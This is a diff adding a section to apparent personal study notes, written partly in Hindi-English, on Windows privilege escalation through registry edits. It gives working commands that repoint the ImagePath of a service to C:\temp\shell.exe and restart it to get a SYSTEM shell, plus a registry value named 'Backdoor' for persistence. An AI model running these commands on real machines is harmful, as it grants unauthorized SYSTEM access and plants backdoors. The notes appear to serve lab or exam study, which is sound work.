@@ -415,3 +415,37 @@ accesschk → permissions
 ---
 
 
+🧠 17. 🛠️ Modifying Registry Keys (PrivEsc Exploitation)
+⚡ 1. Basic Syntax (MUST KNOW)
+reg add <key> /v <value_name> /t <type> /d <data> /f
+
+👉 Meaning:
+
+<key> → registry path
+/v → value name
+/t → type (REG_SZ, REG_DWORD, etc.)
+/d → data (what you want to set)
+/f → force overwrite
+🔥 2. Modify Service Binary Path (Most Common PrivEsc)
+Step 1: Change ImagePath
+reg add HKLM\SYSTEM\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d "C:\temp\shell.exe" /f
+
+👉 What happens:
+
+Service ab tumhara binary run karega
+Agar service SYSTEM me run ho rahi hai → 💥 SYSTEM shell
+Step 2: Restart Service
+net stop regsvc
+net start regsvc
+
+👉 Ya reboot ka wait karo agar restart permission nahi hai
+
+🔐 3. Add New Registry Value
+reg add HKLM\Software\test /v Backdoor /t REG_SZ /d "C:\temp\shell.exe" /f
+
+👉 Useful for:
+
+Persistence
+Startup hijacking
+
+
